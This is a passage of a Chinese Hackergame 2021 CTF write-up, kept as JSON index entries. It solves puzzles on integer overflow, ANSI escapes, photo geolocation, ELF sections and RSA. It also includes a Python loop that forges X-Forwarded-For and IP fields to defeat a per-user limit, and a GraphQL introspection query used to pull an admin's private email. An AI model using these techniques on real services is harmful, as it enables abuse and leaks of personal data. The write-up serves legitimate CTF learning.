<p>\u7136\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag</p>"},{"location":"writeups/hackergame2021/#_4","title":"\u5356\u74dc","text":"<p>\u9898\u76ee\u91cc\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\u5c31\u662f\uff1a</p> <p>\u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002</p> <p>\u9898\u76ee\u7684\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u7528\u4e00\u58069\u548c\u4e00\u58066\u52a0\u8d77\u6765\u5f97\u523020\u3002\u80af\u5b9a\u4e0d\u80fd \u50cf\u534e\u5f3a\u4e00\u6837 \u5288\u74dc\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u5b9a\u662f\u6574\u6570 \u90a3\u5c31\u53ef\u4ee5\u8003\u8651\u6ea2\u51fa \u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u7ed9\u7684\u6570\u5b57\u592a\u5927\uff0c\u5c31\u4f1a\u4f7f\u7ed3\u679c\u6ea2\u51fa\u5230\u6d6e\u70b9\u6570\uff0c\u8fd9\u4e0d\u662f\u60f3\u8981\u7684\uff08\u56e0\u4e3a\u5373\u4f7f\u51d1\u5230\u4e8620.0\u4e5f\u4e0d\u6b63\u786e\uff09</p> <p>\u90a3\u5982\u679c\u6570\u5b57\u518d\u5927\u5462\uff0c\u6bd4\u5982 2000000000000000000\uff0818\u4e2a0\uff09\u4e2a9\u65a4\u7684\u74dc\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u65f6\u76f4\u63a5\u6ea2\u51fa\u5230\u4e86\u8d1f\u6574\u578b -446744073709551616 \u518d\u8865\u4e0a 49638230412172000 \u4e2a9\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 -3616\uff0c\u52a0\u4e0a20\u53ef\u4ee5\u88ab6\u6574\u9664\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a606\u4e2a6\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 20</p> <p>\u606d\u559c\u4f60\u9003\u8fc7\u4e00\u52ab\uff01\u534e\u5f3a\uff5e\u534e\u5f3a\uff01</p>"},{"location":"writeups/hackergame2021/#_5","title":"\u900f\u660e\u7684\u6587\u4ef6","text":"<p>\u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002</p> <p>\u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002</p> <p>\u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002</p> <p>\u62ff\u5230\u6587\u4ef6\uff0c\u770b\u5230\u91cc\u9762\u597d\u591a <code>[ ; m</code> \u4e4b\u7c7b\u7684\uff0c\u518d\u7ed3\u5408\u7ec8\u7aef\u4e2d\u8f93\u51fa\u5e26\u989c\u8272\u6587\u5b57\u7684 <code>\\033[...m;</code> \u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9898\u76ee\u4e2d\u7684 \u201c\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\u201d \u6240\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u628a <code>[</code> \u5168\u5c40\u66ff\u6362\u4e3a <code>\\033[</code>\uff0c\u7136\u540e\u590d\u5236\u5230 python \u4e2d print\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u795e\u5947\u7684\u4e00\u5e55\u4e86\uff08\u5176\u5b9e\u5e76\u6ca1\u5b8c\u5168\u505a\u5b8c\uff0c\u4f46\u662f\u53ef\u4ee5\u5df2\u7ecf\u770b\u4e86\uff09  \u7136\u540e\u8bfb\u51fa flag \u5373\u53ef\uff08\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\uff09</p>"},{"location":"writeups/hackergame2021/#_6","title":"\u65c5\u884c\u7167\u7247","text":"<p>\u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u8bf4\u8d70\u5c31\u8d70\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u4ed6\u5e94\u8be5\u662f\u5728\u9152\u5e97\u4f4f\u4e0b\u4e86\u3002</p> <p>\u4ece\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u4f3c\u4e4e\u5728\u5c0f\u533a\u7684\u4e00\u680b\u9ad8\u697c\u91cc\uff0c\u9644\u8fd1\u8fd8\u6709\u4e00\u5bb6 KFC \u5206\u5e97\u3002\u7a81\u7136\uff0c\u4f60\u610f\u8bc6\u5230\u7167\u7247\u91cc\u900f\u9732\u51fa\u6765\u7684\u4fe1\u606f\u6bd4\u8868\u9762\u4e0a\u770b\u8d77\u6765\u7684\u8981\u591a\u3002</p> <p>\u8bf7\u89c2\u5bdf\u7167\u7247\u5e76\u7b54\u5bf9\u5168\u90e8 5 \u9053\u9898\u4ee5\u83b7\u53d6 flag\u3002\u6ce8\u610f\uff1a\u56fe\u7247\u672a\u5728\u5176\u4ed6\u5730\u65b9\u516c\u5f00\u53d1\u5e03\u8fc7\uff0c\u4e5f\u672a\u91c7\u53d6\u4efb\u4f55\u9690\u5199\u63aa\u65bd\uff08\u901a\u8fc7\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\uff09\u3002 </p> <p>\u201c\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\u201d\uff0c\u6240\u4ee5\u7167\u7247\u4e2d\u6ca1\u6709\u4efb\u4f55\u5730\u5740\u7684\u5143\u4fe1\u606f\uff0c\u53ea\u80fd\u9760\u770b\u56fe \u7ebf\u7d22\uff1a\u6d77\u8fb9\u3001KFC\u3001\u9ad8\u697c\u3001\u5927\u77f3\u5934\u3001\u505c\u8f66\u4f4d</p> <p>\u5148\u770b\u90a3\u4e2aKFC\uff0c\u5927\u6982\u662f\u4e2a\u7f51\u7ea2\u5e97\uff0c\u6240\u4ee5\u641c\u7d22 \u201c\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201d\uff0c\u67e5\u5230\u4e86\u79e6\u7687\u5c9b\uff0c\u800c\u4e14\u4e5f\u662f\u6d77\u8fb9 \u518d\u8fdb\u4e00\u6b65\u770b\u5730\u56fe\u548c\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u786e\u5b9a\u5730\u70b9\u5728 \u79e6\u7687\u5c9b\u65b0\u6fb3\u6d77\u5e95\u4e16\u754c</p> <p>\u7136\u540e\u662f5\u4e2a\u95ee\u9898</p> <p>\u8be5\u7167\u7247\u62cd\u6444\u8005\u7684\u9762\u671d\u65b9\u5411\u4e3a\uff1a</p> <p>\u6839\u636e\u5730\u56fe\uff0c\u5bf9\u6bd4\u4e00\u4e0b\u5c31\u53ef\u4ee5\u5f97\u5230\uff0c\u9762\u671d\u65b9\u5411\u662f \u4e1c\u5357</p> <p>\u8be5\u7167\u7247\u7684\u62cd\u6444\u65f6\u95f4\u5927\u81f4\u4e3a\uff1a</p> <p>\u6839\u636e\u9009\u9879\u91cc\u7684\u65f6\u95f4\uff0c\u4e0b\u5348\u662f\u4e24\u70b9\u534a\u5de6\u53f3\uff0c\u800c\u5728\u4e1c\u5317\u7684\u4e24\u70b9\u534a\u5de6\u53f3\u5176\u5b9e\u548c\u4e2d\u5348\u5dee\u4e0d\u591a\uff0c\u5f71\u5b50\u548c\u5149\u6e29\u4e5f\u4e0d\u592a\u50cf\u8fd9\u4e2a\u6837\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u65f6\u95f4\u5927\u81f4\u662f \u508d\u665a</p> <p>\u8be5\u7167\u7247\u7684\u62cd\u6444\u8005\u6240\u5728\u697c\u5c42\u4e3a\uff1a</p> <p>\u4e0d\u597d\u786e\u5b9a\uff0c\u4f46\u662f\u7b54\u6848\u53ef\u4ee5\u4ea4\u5f88\u591a\u6b21\uff0c\u6240\u4ee5\u4ece9\u5c42\u5de6\u53f3\u4f9d\u6b21\u8bd5\u5c31\u53ef\u4ee5\u4e86\uff0c\u6700\u540e\u5f97\u5230\u697c\u5c42\u662f 14</p> <p>\u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u662f\uff1a</p> <p>\u76f4\u63a5\u7528\u5730\u56fe\u8f6f\u4ef6\u641c \u201c\u79e6\u7687\u5c9b\u65b0\u6fb3 KFC\u201d \u5c31\u53ef\u4ee5\u67e5\u5230\u90a3\u5bb6\u5e97\u94fa\uff0c\u4e5f\u7ed9\u4e86\u7535\u8bdd\uff0c\u6216\u8005\u641c\u7d22 \u201d\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7535\u8bdd\uff1a0335-7168800</p> <p>\u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u5de6\u4fa7\u5efa\u7b51\u6709\u4e09\u4e2a\u6c34\u5e73\u6392\u5217\u7684\u6c49\u5b57\uff0c\u5b83\u4eec\u662f\uff1a</p> <p>\u901a\u8fc7\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u770b\u5230 KFC \u5de6\u8fb9\u7684\u5efa\u7b51\u4e0a\u5199\u4e86 \u6d77\u8c5a\u9986</p>"},{"location":"writeups/hackergame2021/#flag","title":"FLAG \u52a9\u529b\u5927\u7ea2\u5305","text":"<p>\u53c2\u4e0e\u6d3b\u52a8\uff0c\u52a9\u529b\u62bd\u5956\uff01\u96c6\u6ee1 1 \u4e2a flag\uff0c\u5373\u53ef\u63d0\u53d6 1 \u4e2a flag\u3002</p> <p>\u606d\u559c\u4f60\u79ef\u6512\u5230 0.5\u2026\u2026 \u4e2a flag\uff0c  \u5269\u4f59\u65f6\u95f4\uff1a10\u520600\u79d2</p> <p>\u5df2\u6709 0 \u4f4d\u597d\u53cb\u4e3a\u60a8\u52a9\u529b\u3002</p> <p>\u5c06\u5982\u4e0b\u94fe\u63a5\u5206\u4eab\u7ed9\u597d\u53cb\uff0c\u53ef\u4ee5\u83b7\u5f97\u597d\u53cb\u52a9\u529b\uff0c\u83b7\u5f97\u66f4\u591a flag\uff1a\u2026\u2026</p> <p>\u8001\u5e76\u5915\u5915\u4e86\uff0c\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\u548c\u770b\u89c4\u5219\u53ef\u4ee5\u77e5\u9053\uff0cip \u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684\u7528\u6237\u88ab\u89c6\u4e3a\u540c\u4e00\u7528\u6237\uff0c\u5373 ip \u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u70b9\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u6837\u624d\u662f\u4e0d\u540c\u7528\u6237 \u518d\u7528\u865a\u62df\u673a\u548c\u624b\u673a\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u6bcf\u4e2a\u7528\u6237\u589e\u52a0\u7684 flag \u6570\u91cf\u5f88\u5c0f \u6240\u4ee5\u63a8\u6d4b\u9700\u8981200+\u4e2a ip \u5730\u5740\uff0c\u80af\u5b9a\u4e0d\u4f1a\u8981\u771f\u7684\u8f6c\u53d1\uff0c\u800c\u4e14\u4e5f\u5f88\u96be\u51d1\u51fa\u5f88\u591a\u4e0d\u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684 ip</p> <p>\u4e8e\u662f\u5728 BurpSuite \u91cc\u9762\u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u6b21\u70b9\u51fb\u201c\u52a9\u529b\u201d\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u5230\u52a9\u529b\u94fe\u63a5\u7684 POST\uff0c\u5185\u5bb9\u4e3a ip \u5730\u5740  \u7136\u540e\u5c06\u5176\u53d1\u9001\u5230 Repeater \u4e2d\uff0c\u5c1d\u8bd5\u66f4\u6539 ip \u5730\u5740\uff0c\u5f97\u5230\u7684 Response \u4e2d\u8bf4 \u201c\u5931\u8d25\uff01\u68c0\u6d4b\u5230\u524d\u540e\u7aef\u68c0\u6d4b IPv4 \u5730\u5740\u4e0d\u5339\u914d\u201d</p> <p>\u6240\u4ee5\u4ec5\u4ec5\u66f4\u6539 POST \u5185\u5bb9\u7684 ip \u662f\u4e0d\u591f\u7684\uff0c\u800c\u63d0\u4f9b\u7ed9\u68c0\u6d4b\u7684\u5185\u5bb9\u4e5f\u4ec5\u4ec5\u662f\u4e00\u4e2a POST\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539 POST \u5934\uff0c\u6dfb\u52a0 X-Forwarded-For \u7136\u540e\u4f7f\u7528 python \u5c31\u53ef\u4ee5\u5faa\u73af\u53d1\u9001 POST \u5e76\u4f2a\u9020 ip \u5730\u5740\u5f97\u5230256\u4e2a\u52a9\u529b\u4e86\uff0c\u521a\u597d\u8fbe\u52301\u4e2aflag\uff1a \uff08\u8981\u6ce8\u610f sleep \u4e00\u6bb5\u65f6\u95f4\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u64cd\u4f5c\u8fc7\u5feb\u62d2\u7edd\u7684\u60c5\u51b5\uff1b\u4e5f\u4e0d\u8981 sleep \u8fc7\u957f\uff0c\u5426\u5219\u8d85\u8fc710\u5206\u949f flag \u5c31\u65e0\u6548\u4e86\uff09 <pre><code>import requests \nimport time\nfrom tqdm import tqdm\n\nurl = \"http://202.38.93.111:10888/invite/...\"\n\nwith tqdm(total=256) as pbar:\n    for i in range(256):\n        res = requests.post(url, data={\"ip\": f\"{i}.0.0.0\"}, headers={\"X-Forwarded-For\": f\"{i}.0.0.0\"})\n        if \"\u6210\u529f\" not in res.text:\n            print(\"[x] \u5931\u8d25\")\n            print(res.text)\n        time.sleep(1.5)\n        pbar.update(1)\n</code></pre></p>"},{"location":"writeups/hackergame2021/#amnesia","title":"Amnesia","text":""},{"location":"writeups/hackergame2021/#_7","title":"\u8f7b\u5ea6\u5931\u5fc6","text":"<p>\u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world!\uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002</p> <p>\u7f16\u8bd1\u6307\u4ee4\uff1a<code>gcc -O file.c -m32</code></p> <p>\u8fd0\u884c\u6307\u4ee4\uff1a<code>./a.out</code></p> <p>\u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002</p> <p>ELF\uff08Executable and Linkable Format\uff09\u662f Linux \u4e0b\u5e38\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u4e0d\u540c\u7684\u8282\uff1a</p> <ul> <li><code>.text</code> \u8282\uff1a\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u4ee3\u7801</li> <li><code>.data</code> \u8282\uff1a\u5b58\u653e\u53ef\u4fee\u6539\u7684\u6570\u636e\uff0c\u4e00\u822c\u662f\u975e const \u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf</li> <li><code>.rodata</code> \u8282\uff1a\u5373 read only data\uff0c\u4e00\u822c\u662f\u5e38\u91cf\u6216\u8005\u5b57\u7b26\u4e32</li> <li><code>.bss</code> \u8282\uff1a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u53d8\u91cf</li> <li>\u2026\u2026</li> </ul> <p>\u800c\u8fd9\u9053\u9898\u76ee\u5219\u662f\u5728\u7f16\u8bd1\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 a.out \u540e\uff0c\u6e05\u7a7a .data \u548c .rodata \u9996\u5148\u4e0d\u59a8\u6b63\u5e38\u7f16\u5199\u4e00\u4e2a\u8f93\u51fa \u201cHello, world!\u201d \u7684\u7a0b\u5e8f\uff1a <pre><code>printf(\"Hello, world!\\n\");\n</code></pre> \u7136\u540e\u7f16\u8bd1\uff0c\u518d\u62d6\u5230 IDA \u91cc   \u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u7684 \"Hello, world!\" \u88ab\u653e\u5230\u4e86 .rodata \u8282\u4e2d\uff0c\u4f1a\u88ab\u6e05\u9664\u6389\uff0c\u6240\u4ee5\u8fd9\u6837\u5199\u4e0d\u884c</p> <p>\u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u4f1a\u88ab\u653e\u5230 .rodata \u4e2d\u6e05\u9664\uff0c\u5199\u6210\u5168\u5c40\u53d8\u91cf\u53c8\u4f1a\u653e\u5230 .data \u4e2d \u4f46\u662f\uff0c\u5982\u679c\u5199\u6210\u5c40\u90e8\u53d8\u91cf\u5462\uff1a <pre><code>char str[] = \"Hello, world!\\n\";\nprintf(str);\n</code></pre> \u7f16\u8bd1\uff0c\u62d6\u5230 IDA \u91cc  \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u6b21\u7684\u5b57\u7b26\u4e32\u76f4\u63a5\u5199\u5230\u4e86 .text \u8282\u4e2d\uff0c\u5220\u6389\u4e86 .data .rodata \u4e5f\u6ca1\u6709\u5f71\u54cd \u6240\u4ee5\u628a\u8fd9\u4e2a\u4ee3\u7801\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u8f93\u51fa \u201cHello, world!\u201c \u62ff\u5230 flag \u4e86 </p> <p>\u6e05\u9664\u8bb0\u5fc6\u76f4\u63a5\u628a .text \u8282\u5168\u5220\u6389\u4e86\uff0c\u60f3\u4e86\u5f88\u4e45\u4e5f\u4e0d\u77e5\u9053\u548b\u641e\uff0c\u867d\u7136\u53ef\u4ee5 __attribute__ ((section (\"...\"))) \u6765\u628a\u51fd\u6570\u6216\u53d8\u91cf\u585e\u5230\u6307\u5b9a\u7684\u8282\u4e2d\u3002\u4f46\u8fd8\u662f\u4e0d\u6e05\u695a\u8981\u600e\u4e48\u89e3\u51b3\u6bb5\u9519\u8bef\u7684\u95ee\u9898qwq </p>"},{"location":"writeups/hackergame2021/#_8","title":"\u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f","text":"<p>\u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002</p> <p>\u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f</p> <p>\u9898\u76ee\u4fe1\u606f\u7ed9\u7684\u5f88\u5145\u5206\uff0c\u7528\u7684\u662f GraphQL\uff0c\u8981\u7528\u5176\u5f97\u5230 admin \u7684\u90ae\u7bb1</p> <p>\u6ca1\u63a5\u89e6\u8fc7 GraphQL\uff0c\u6240\u4ee5\u76f4\u63a5\u5fc5\u5e94\uff08\u9003 \u67e5\u5230\u4e86\u5f88\u591a\u6709\u7528\u7684\u4e1c\u897f\uff1a</p> <ul> <li>GraphQL\u5b98\u7f51\uff1a\u4e86\u89e3\u4e00\u4e0b GraphQL \u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u8981\u600e\u4e48\u7528</li> <li>GraphiQL\uff1a\u4e00\u4e2a\u8fdb\u884c GraphQL \u67e5\u8be2\u7684 GUI</li> <li>\u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e</li> <li>GraphQL Voyager\uff1a\u53ef\u89c6\u5316\u73b0\u5b9e GraphQL \u5185\u7701\u51fa\u7684\u7ed3\u6784</li> </ul> <p>\u7b80\u800c\u8a00\u4e4b\uff0cGraphQL \u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e00\u6b21 query \u8bf7\u6c42\u67e5\u8be2\u591a\u4e2a\u8d44\u6e90\u7684 API \u6a21\u5f0f\uff0c\u53ea\u8981 <code>\u7f51\u5740/graphql?query=...</code> \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8be2 \u6709\u4e9b\u4f7f\u7528 GraphQL \u7684\u7f51\u7ad9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8bbf\u95ee <code>\u7f51\u5740/graphiql</code> \u5f97\u5230\u67e5\u8be2\u7684 GUI \u4f46\u662f\u672c\u9898\u4e2d\u7981\u6b62\u4e86\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 GraphiQL \u8f6f\u4ef6\u6765\u8fdb\u884c\u67e5\u8be2</p> <p>\u5728\u7b2c\u4e09\u4e2a\u94fe\u63a5\u4e2d\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u53ef\u4ee5\u5229\u7528 GraphQL \u7684\u5185\u7701\u67e5\u8be2\u6765\u6cc4\u9732\u51fa\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u628a\u5176\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u4e22\u5230 GraphiQL \u4e2d\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c <pre><code>query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }}\n</code></pre> </p> <p>\u7136\u540e\u628a\u7ed3\u679c\u4e22\u5230 GraphQL Voyager \u4e2d\u5c31\u53ef\u4ee5\u5f97\u5230\u53ef\u89c6\u5316\u7684\u7ed3\u6784\uff1a </p> <p>\u6240\u4ee5\u53ea\u9700\u8981\u6839\u636e id query \u4e00\u4e0b user \u5c31\u53ef\u4ee5\u4e86\uff1a <pre><code>query { user(id: 1) { privateEmail, } }\n\n&gt;&gt;&gt; {\n  \"data\": {\n    \"user\": {\n      \"privateEmail\": \"flag{...}\"\n    }\n  }\n}\n</code></pre></p>"},{"location":"writeups/hackergame2021/#easy-rsa","title":"Easy RSA","text":"<p>\u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e\uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002</p> <p>\u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002</p> <p>\u8c22\u9080\uff0c\u6ca1\u6709\u6570\u7406\u57fa\u7840</p> <p>\u770b\u4ee3\u7801\uff01 <pre><code>e = 65537\n\ndef get_p():\n    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451\n    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439\n    value_p = sympy.nextprime((math.factorial(y)) % x)  # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\n    return value_p\n\ndef get_q():\n    value = [getPrime(256)]\n    for i in range(1, 10):\n        value.append(sympy.nextprime(value[i - 1]))\n    print(\"value[-1] = \", value[-1])\n    # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967\n    n = 1\n    for i in range(10):\n        n = n * value[i]\n    q = getPrime(512)\n    value_q = pow(q, e, n)\n    print(\"value_q = \", value_q)\n    # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819\n    return sympy.nextprime(q)\n\n# this destroyes the rsa cryptosystem\np = get_p()\nq = get_q()\n\nm = int.from_bytes(open(\"flag.txt\", \"rb\").read(), \"big\")\nc = pow(m, e, p * q)\nprint(\"c = \", c)\n# c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478\n</code></pre> \u53ef\u4ee5\u770b\u5230\uff0c\u5176\u4e2d\u8981\u89e3\u51b3\u7684\u5c31\u662f <code>get_p()</code> \u4e2d y! % x \u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4ee5\u53ca <code>get_q()</code> \u4e2d q \u662f\u54ea\u4e2a\u968f\u673a\u7684512\u4f4d\u8d28\u6570\u7684\u95ee\u9898</p> <p>get_p:</p> <p>\u4ee3\u7801\u91cc\u4e5f\u7ed9\u4e86 Hint\uff0c\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\u3002x \u548c y \u90fd\u5f88\u5927\uff0c\u4f46\u662f\u4e24\u4e2a\u7684\u5dee\u5e76\u4e0d\u5927\uff1b\u800c\u4e14\u53ef\u4ee5\u4e22\u5230 python \u91cc\u9a8c\u8bc1\u51fa x \u662f\u4e00\u4e2a\u8d28\u6570 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5a01\u5c14\u900a\u5b9a\u7406 \u4e5f\u67e5\u5230\u4e86\u5a01\u5c14\u900a\u5b9a\u7406\u5728 RSA \u9898\u76ee\u4e2d\u7684\u5e94\u7528\uff1aBUU-RSA [RoarCTF2019]babyRSA</p> <p>\u8981\u6c42 y! % x\uff08x\u662f\u8d28\u6570\uff09 \u6839\u636e\u5a01\u5c14\u900a\u5b9a\u7406\uff0c\u6709</p> \\[ (x - 1)! \\equiv -1\\pmod{x} \\] <p>\u6240\u4ee5\uff1a</p> \\[ y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x} \\] <p>\u4ee4 \\(k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)...(x-1)x\\) \uff0c\u6240\u4ee5\u6709\uff1a</p> \\[ y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x} \\] <p>\uff08\u5176\u4e2d \\(\\mathrm{inv}(k, x)\\) \u8868\u793a\u6a21 x \u4e0b k \u7684\u9006\u5143\uff09 \u6240\u4ee5\u91cd\u5199 get_p() \u5373\u53ef\u6b63\u786e\u7684\u5f97\u5230 p\uff1a <pre><code>def get_p():\n    x = ...\n    y = ...\n    k = 1\n    for i in range(y + 1, x):\n        k = (k * i) % x \n    res = (-gmpy2.invert(k, x)) % x \n    return sympy.nextprime(res)\n</code></pre></p> <p>get_q:</p> <p>\u76f8\u6bd4\u6765\u8bf4\uff0cget_q \u5c31\u6ca1\u90a3\u4e48\u9700\u8981\u6280\u5de7\u4e86 \u7ed9\u51fa\u4e86 value[-1] 